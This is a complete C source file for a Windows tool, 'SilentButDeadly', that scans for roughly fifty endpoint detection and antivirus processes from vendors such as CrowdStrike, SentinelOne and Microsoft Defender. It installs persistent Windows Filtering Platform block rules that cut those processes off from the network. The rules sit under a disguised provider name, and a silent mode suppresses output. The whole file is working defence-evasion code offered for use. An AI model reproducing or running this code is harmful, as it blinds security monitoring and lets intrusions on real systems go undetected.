/*
 * SilentButDeadly_Persistent.c
 * 
 * Version: 3.0 (Persistent/Command Mode)
 * - Persists after exit (until reboot or deactivation command)
 * - usage: "SilentButDeadly.exe" to activate
 * - usage: "SilentButDeadly.exe --deactivate" to clean up
 */

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <fwpmu.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <ole2.h>
#include <Psapi.h>

#pragma comment(lib, "Fwpuclnt.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Advapi32.lib")

/*------------------------------------------------------------------*/
/*                       CONFIGURATION                              */
/*------------------------------------------------------------------*/

// SET THIS TO 1 FOR "++"/"--" OUTPUT, OR 0 FOR COMPLETELY SILENT
#define DEBUG_MODE 1 

#define MAX_TARGETS           50
#define WFP_PROVIDER_NAME     L"System Network Maintenance Provider"
#define WFP_SUBLAYER_NAME     L"System Network Maintenance Sublayer"

// Static GUIDs required so we can identify and remove our rules in a separate process
// Provider GUID: {689C6F61-F372-4E84-9347-123456789ABC}
static const GUID STATUS_PROVIDER_GUID = { 0x689c6f61, 0xf372, 0x4e84, { 0x93, 0x47, 0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc } };
// Sublayer GUID: {5733A74A-7353-48C0-9486-123456789DEF}
static const GUID STATUS_SUBLAYER_GUID = { 0x5733a74a, 0x7353, 0x48c0, { 0x94, 0x86, 0x12, 0x34, 0x56, 0x78, 0x9d, 0xef } };

// Output Macros
#if DEBUG_MODE
    #define STATUS_SUCCESS() printf("++\n")
    #define STATUS_FAIL()    printf("--\n")
#else
    #define STATUS_SUCCESS() do {} while(0)
    #define STATUS_FAIL()    do {} while(0)
#endif

/*------------------------------------------------------------------*/
/*                         STRUCTURES                               */
/*------------------------------------------------------------------*/
typedef struct _EDR_TARGET {
    const char* processName;
    const char* vendor;
    BOOL        foundProcess;
    DWORD       processId;
} EDR_TARGET;

/*------------------------------------------------------------------*/
/*                     GLOBAL VARIABLES                             */
/*------------------------------------------------------------------*/
EDR_TARGET g_EDRTargets[] = {
    {"SentinelAgent.exe", "SentinelOne", FALSE, 0},
    {"SentinelServiceHost.exe", "SentinelOne", FALSE, 0},
    {"SentinelStaticEngine.exe", "SentinelOne", FALSE, 0},
    {"SentinelUI.exe", "SentinelOne", FALSE, 0},
    {"CSFalconService.exe", "CrowdStrike", FALSE, 0},
    {"CSFalconContainer.exe", "CrowdStrike", FALSE, 0},
    {"MsMpEng.exe", "Microsoft Defender", FALSE, 0},
    {"MsSense.exe", "Microsoft Defender ATP", FALSE, 0},
    {"SenseIR.exe", "Microsoft Defender ATP", FALSE, 0},
    {"SenseCncProxy.exe", "Microsoft Defender ATP", FALSE, 0},
    {"cb.exe", "Carbon Black", FALSE, 0},
    {"RepMgr.exe", "Carbon Black", FALSE, 0},
    {"RepUtils.exe", "Carbon Black", FALSE, 0},
    {"RepWAV.exe", "Carbon Black", FALSE, 0},
    {"RepWSC.exe", "Carbon Black", FALSE, 0},
    {"CylanceSvc.exe", "Cylance", FALSE, 0},
    {"CyOptics.exe", "Cylance", FALSE, 0},
    {"CyUpdate.exe", "Cylance", FALSE, 0},
    {"ccSvcHst.exe", "Symantec Endpoint Protection", FALSE, 0},
    {"rtvscan.exe", "Symantec", FALSE, 0},
    {"SymCorpUI.exe", "Symantec", FALSE, 0},
    {"McTray.exe", "McAfee", FALSE, 0},
    {"masvc.exe", "McAfee", FALSE, 0},
    {"macmnsvc.exe", "McAfee", FALSE, 0},
    {"mfemms.exe", "McAfee", FALSE, 0},
    {"mfevtps.exe", "McAfee", FALSE, 0},
    {"PccNTMon.exe", "Trend Micro", FALSE, 0},
    {"NTRTScan.exe", "Trend Micro", FALSE, 0},
    {"TmListen.exe", "Trend Micro", FALSE, 0},
    {"TmCCSF.exe", "Trend Micro", FALSE, 0},
    {"SSPService.exe", "Sophos", FALSE, 0},
    {"SavService.exe", "Sophos", FALSE, 0},
    {"SAVAdminService.exe", "Sophos", FALSE, 0},
    {"SophosFIM.exe", "Sophos", FALSE, 0},
    {"avp.exe", "Kaspersky", FALSE, 0},
    {"avpui.exe", "Kaspersky", FALSE, 0},
    {"ksde.exe", "Kaspersky", FALSE, 0},
    {"ksdeui.exe", "Kaspersky", FALSE, 0},
    {"ekrn.exe", "ESET", FALSE, 0},
    {"egui.exe", "ESET", FALSE, 0},
    {"eOPPMonitor.exe", "ESET", FALSE, 0},
    {"cyserver.exe", "Cortex XDR", FALSE, 0},
    {"cytray.exe", "Cortex XDR", FALSE, 0},
    {"CyveraService.exe", "Cortex XDR", FALSE, 0},
    {"xagt.exe", "FireEye", FALSE, 0},
    {"xagtnotif.exe", "FireEye", FALSE, 0},
    {"elastic-agent.exe", "Elastic Security", FALSE, 0},
    {"elastic-endpoint.exe", "Elastic Security", FALSE, 0},
    {NULL, NULL, FALSE, 0}
};

HANDLE g_EngineHandle = NULL;

/*------------------------------------------------------------------*/
/*                    FUNCTION DECLARATIONS                         */
/*------------------------------------------------------------------*/
BOOL FindEDRProcesses(void);
BOOL OpenWfpEngine(void);
BOOL CleanUpExistingRules(void);
BOOL InstallFilters(void);
BOOL GetProcessImagePathW(DWORD pid, LPWSTR pBuffer, DWORD cchBuffer);
int CreateProcessFilters(const char* processName, FWP_BYTE_BLOB* pAppIdBlob);

/*------------------------------------------------------------------*/
/*                     UTILITY FUNCTIONS                            */
/*------------------------------------------------------------------*/
BOOL GetProcessImagePathW(DWORD pid, LPWSTR pBuffer, DWORD cchBuffer) 
{
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) return FALSE;
    BOOL ok = QueryFullProcessImageNameW(hProc, 0, pBuffer, &cchBuffer);
    CloseHandle(hProc);
    return ok;
}

BOOL FindEDRProcesses(void) 
{
    BOOL found = FALSE;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32 = {0};
    
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            for (int i = 0; g_EDRTargets[i].processName != NULL; i++) {
                if (_stricmp(pe32.szExeFile, g_EDRTargets[i].processName) == 0) {
                    g_EDRTargets[i].foundProcess = TRUE;
                    g_EDRTargets[i].processId = pe32.th32ProcessID;
                    found = TRUE;
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return found;
}

/*------------------------------------------------------------------*/
/*                     WFP CORE FUNCTIONS                           */
/*------------------------------------------------------------------*/

// Open WFP Engine in a standard (non-dynamic) session
// This ensures rules persist after the tool exits
BOOL OpenWfpEngine(void)
{
    if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED))) return FALSE;

    FWPM_SESSION session = {0};
    session.flags = 0; // Not DYNAMIC. Rules will persist until reboot or deletion.

    if (FwpmEngineOpen(NULL, RPC_C_AUTHN_WINNT, NULL, &session, &g_EngineHandle) != ERROR_SUCCESS) {
        return FALSE;
    }
    return TRUE;
}

// Remove the provider. This cascades and deletes all sublayers and filters we created.
BOOL CleanUpExistingRules(void)
{
    if (!g_EngineHandle) return FALSE;

    DWORD status = FwpmTransactionBegin(g_EngineHandle, 0);
    if (status != ERROR_SUCCESS) return FALSE;

    // Delete by our specific GUID. This removes everything associated with it.
    status = FwpmProviderDeleteByKey(g_EngineHandle, &STATUS_PROVIDER_GUID);
    
    // It's okay if it doesn't exist (FWP_E_PROVIDER_NOT_FOUND)
    if (status != ERROR_SUCCESS && status != FWP_E_PROVIDER_NOT_FOUND) {
        FwpmTransactionAbort(g_EngineHandle);
        return FALSE;
    }

    FwpmTransactionCommit(g_EngineHandle);
    return TRUE;
}

int CreateProcessFilters(const char* processName, FWP_BYTE_BLOB* pAppIdBlob)
{
    DWORD status;
    int filtersCreated = 0;
    
    const GUID* layerKeys[] = {
        &FWPM_LAYER_ALE_AUTH_CONNECT_V4,
        &FWPM_LAYER_ALE_AUTH_CONNECT_V6,
        &FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4,
        &FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V6
    };
    
    for (int i = 0; i < 4; i++) {
        FWPM_FILTER filter = {0};
        FWPM_FILTER_CONDITION filterConditions[1] = {0};
        GUID filterGuid;
        
        if (FAILED(CoCreateGuid(&filterGuid))) continue;
        
        filterConditions[0].fieldKey = FWPM_CONDITION_ALE_APP_ID;
        filterConditions[0].matchType = FWP_MATCH_EQUAL;
        filterConditions[0].conditionValue.type = FWP_BYTE_BLOB_TYPE;
        filterConditions[0].conditionValue.byteBlob = pAppIdBlob;
        
        filter.filterKey = filterGuid;
        filter.providerKey = (GUID*)&STATUS_PROVIDER_GUID;
        filter.layerKey = *layerKeys[i];
        filter.subLayerKey = STATUS_SUBLAYER_GUID;
        filter.weight.type = FWP_EMPTY;
        filter.numFilterConditions = 1;
        filter.filterCondition = filterConditions;
        filter.action.type = FWP_ACTION_BLOCK;
        filter.flags = FWPM_FILTER_FLAG_CLEAR_ACTION_RIGHT; 
        
        status = FwpmFilterAdd(g_EngineHandle, &filter, NULL, NULL);
        if (status == ERROR_SUCCESS) {
            filtersCreated++;
        }
    }
    return filtersCreated;
}

BOOL InstallFilters(void)
{
    // 1. Ensure clean slate first
    CleanUpExistingRules();

    // 2. Start Transaction
    if (FwpmTransactionBegin(g_EngineHandle, 0) != ERROR_SUCCESS) return FALSE;

    // 3. Add Provider
    FWPM_PROVIDER provider = {0};
    provider.providerKey = STATUS_PROVIDER_GUID;
    provider.displayData.name = WFP_PROVIDER_NAME;
    // Note: We are not setting FWPM_PROVIDER_FLAG_PERSISTENT, 
    // so these rules will vanish on Reboot, but persist after App exit.
    
    if (FwpmProviderAdd(g_EngineHandle, &provider, NULL) != ERROR_SUCCESS) {
        FwpmTransactionAbort(g_EngineHandle);
        return FALSE;
    }

    // 4. Add Sublayer
    FWPM_SUBLAYER sublayer = {0};
    sublayer.subLayerKey = STATUS_SUBLAYER_GUID;
    sublayer.displayData.name = WFP_SUBLAYER_NAME;
    sublayer.providerKey = (GUID*)&STATUS_PROVIDER_GUID;
    sublayer.weight = 0xFFFF; // Highest weight
    
    if (FwpmSubLayerAdd(g_EngineHandle, &sublayer, NULL) != ERROR_SUCCESS) {
        FwpmTransactionAbort(g_EngineHandle);
        return FALSE;
    }

    // 5. Scan and Add Filters
    BOOL anyBlocked = FALSE;
    
    for (int i = 0; g_EDRTargets[i].processName != NULL; i++) {
        if (!g_EDRTargets[i].foundProcess) continue;
        
        WCHAR imagePathW[MAX_PATH] = {0};
        if (!GetProcessImagePathW(g_EDRTargets[i].processId, imagePathW, MAX_PATH)) continue;
        
        FWP_BYTE_BLOB* pAppIdBlob = NULL;
        if (FwpmGetAppIdFromFileName0(imagePathW, &pAppIdBlob) != ERROR_SUCCESS) continue;
        
        int count = CreateProcessFilters(g_EDRTargets[i].processName, pAppIdBlob);
        FwpmFreeMemory0((void**)&pAppIdBlob);
        
        if (count > 0) anyBlocked = TRUE;
    }

    // 6. Commit
    if (anyBlocked) {
        if (FwpmTransactionCommit(g_EngineHandle) != ERROR_SUCCESS) {
            return FALSE;
        }
        return TRUE;
    } else {
        // If no processes found, we still abort the transaction so we don't leave empty providers
        FwpmTransactionAbort(g_EngineHandle);
        return TRUE; // Not an error, just nothing to do
    }
}

/*------------------------------------------------------------------*/
/*                            MAIN                                  */
/*------------------------------------------------------------------*/
int main(int argc, char* argv[])
{
    BOOL isAdmin = FALSE;
    BOOL isDeactivateMode = FALSE;

    // Check args
    for (int i = 1; i < argc; i++) {
        if (_stricmp(argv[i], "-d") == 0 || _stricmp(argv[i], "--deactivate") == 0) {
            isDeactivateMode = TRUE;
        }
    }

    // Admin Check
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
        CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin);
        FreeSid(AdministratorsGroup);
    }
    
    if (!isAdmin) {
        STATUS_FAIL(); 
        return -1;
    }

    // Connect to WFP
    if (!OpenWfpEngine()) {
        STATUS_FAIL();
        return 1;
    }

    if (isDeactivateMode) {
        // --- DEACTIVATE MODE ---
        // Just remove the provider. BFE handles the rest.
        if (CleanUpExistingRules()) {
            STATUS_SUCCESS();
        } else {
            STATUS_FAIL();
        }
    } 
    else {
        // --- ACTIVATE MODE ---
        // 1. Scan
        FindEDRProcesses(); // We don't fail if none found, we just proceed
        
        // 2. Install
        if (InstallFilters()) {
            STATUS_SUCCESS();
        } else {
            STATUS_FAIL();
        }
    }

    // Close engine handle (rules remain because session is not DYNAMIC)
    if (g_EngineHandle) {
        FwpmEngineClose(g_EngineHandle);
    }
    
    CoUninitialize();
    return 0;
}
